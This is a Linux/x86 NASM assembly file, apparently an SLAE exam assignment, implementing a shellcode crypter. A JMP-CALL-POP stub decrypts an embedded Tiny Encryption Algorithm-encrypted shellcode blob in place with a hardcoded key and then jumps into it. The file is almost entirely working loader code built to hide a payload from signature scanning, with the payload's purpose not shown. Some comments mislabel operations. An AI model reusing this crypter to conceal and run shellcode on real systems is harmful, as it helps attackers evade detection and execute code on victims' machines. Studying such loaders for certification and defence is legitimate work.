; Filename: tea_decrypt.nasm
; Author: Ray Doyle
; Website: https://www.doyler.net
;
; Purpose: SLAE Exam Assignment #7 - Custom Shellcode Crypter (Linux/x86) using the Tiny Encryption Algorithm - 148 bytes
; Algorithm: https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm

section .text

global _start

_start:
   jmp call_decrypt

pre_decrypt:
   ; JMP-CALL-POP to get EAX pointing to the encrypted shellcode
   pop eax

   ; Point EDX to the decryption key
   lea edx, [eax + 0x21]

   ; Push EAX onto the stack to keep track of where in the shellcode the decryption routine is
   push eax

decrypt:
   ; Move the saved address into EAX
   ; Note that this isn't necessary for the first loop, but doesn't change the functionality
   mov eax, [esp]

   ; Check to see if we're at the end of the shellcode
   ; If so, decryption is complete, so jump to the decrypted shellcode
   cmp byte [eax], 0xAA
   je EncryptedShellcode   

   ; Load the first word of the encrypted shellcode into ESI
   mov esi,[eax]

   ; Load the second word into EDI
   mov edi,[eax+0x4]

   ; Begin the counter for the decrypt loop
   ; Note that 0x9e3779b9 >> 5 = 0xc6ef3720
   mov ecx, 0xc6ef3720

decrypt_loop:
   ;
   ; Calculate decrypted word #2 (v1)
   ;
   mov ebx,esi
   ; (v0 << 4)
   shl ebx,0x4
   ; (v0 << 4) + k2
   add ebx,[edx+0x8]
   ; (v0 + sum)
   lea eax,[esi+ecx*1]
   ; (v0 << 4) + k2) ^ (v0 + sum)
   xor ebx,eax
   mov eax,esi
   ; (v0 >> 5)
   shr eax,0x5
   ; (v0 >> 5) + k3
   add eax,[edx+0xc]
   ; ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3)
   xor ebx,eax
   ; sum -= delta
   sub edi, ebx

   ;
   ; Calculate decrypted word #1 (v0)
   ;
   mov ebx,edi
   ; (v1 << 4)
   shl ebx,0x4
   ; (v1 << 4) + k0
   add ebx,[edx]
   ; (v1 + sum)
   lea eax,[edi+ecx*1]
   ; (v1 << 4) + k02) ^ (v1 + sum)
   xor ebx,eax
   mov eax,edi
   ; (v1 >> 5)
   shr eax,0x5
   ; (v1 >> 5) + k1
   add eax,[edx+0x4]
   ; ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1)
   xor ebx,eax
   ; sum -= delta
   sub esi, ebx

   ; Subtract delta from the sum and loop
   ; Note that ECX will only be zero after 32 iterations
   sub ecx, 0x9e3779b9
   jnz decrypt_loop

   ; Retrieve stored EAX from the stack
   pop eax
 
   ; Replace encrypted shellcode word's with decrypted versions
   mov [eax],esi
   mov [eax+0x4],edi

   ; Add 8 to EAX to begin decrypting the next two words
   add eax, 0x8
   ; Save the modified EAX onto the stack
   push eax
   jmp short decrypt

call_decrypt:
   call pre_decrypt
   ; Encrypted shellcode + marker byte (0xaa)
   EncryptedShellcode db 0x32, 0x8d, 0xc9, 0x7c, 0x7a, 0x8a, 0xe7, 0x47, 0x6b, 0x2a, 0x09, 0x6c, 0xe8, 0xcd, 0x32, 0x05, 0x89, 0xa0, 0xc0, 0x1a, 0x59, 0x71, 0x89, 0x4a, 0x06, 0xff, 0x7d, 0xbd, 0xdd, 0x64, 0x15, 0x48, 0xAA
   ; Decryption key
   ; NOTE: THIS SHOULDN'T BE HARDCODED IN AN ACTUAL APPLICATION
   key db "WQVh8{7C?gE_B<d$"